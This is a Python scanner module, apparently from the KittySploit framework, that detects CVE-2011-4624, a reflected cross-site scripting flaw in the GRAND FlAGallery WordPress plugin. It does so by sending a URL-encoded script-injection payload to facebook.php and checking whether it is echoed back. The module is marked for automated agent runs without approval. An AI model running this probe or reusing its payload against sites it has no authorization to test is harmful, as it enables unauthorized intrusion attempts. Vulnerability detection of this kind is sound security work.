#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A cross-site scripting (XSS) vulnerability in facebook."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'GRAND FlAGallery 1.57 - Cross-Site Scripting Detection',
        'description': 'A cross-site scripting (XSS) vulnerability in facebook.php in the GRAND FlAGallery plugin (flash-album-gallery) before 1.57 for WordPress allows remote attackers to inject arbitrary web script or HTML via the i parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2011', 'wordpress', 'xss', 'wp-plugin', 'codeasily', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2011-4624',
            'http://www.openwall.com/lists/oss-security/2011/12/23/2',
            'http://plugins.trac.wordpress.org/changeset/469785',
            'http://wordpress.org/extend/plugins/flash-album-gallery/changelog/',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2011-4624',
    }

    def run(self):
        path = '/wp-content/plugins/flash-album-gallery/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Grand Flagallery',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-content/plugins/flash-album-gallery/facebook.php?i=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='GRAND FlAGallery 1.57 - Cross-Site Scripting detected', path=path)
            return True
        return False

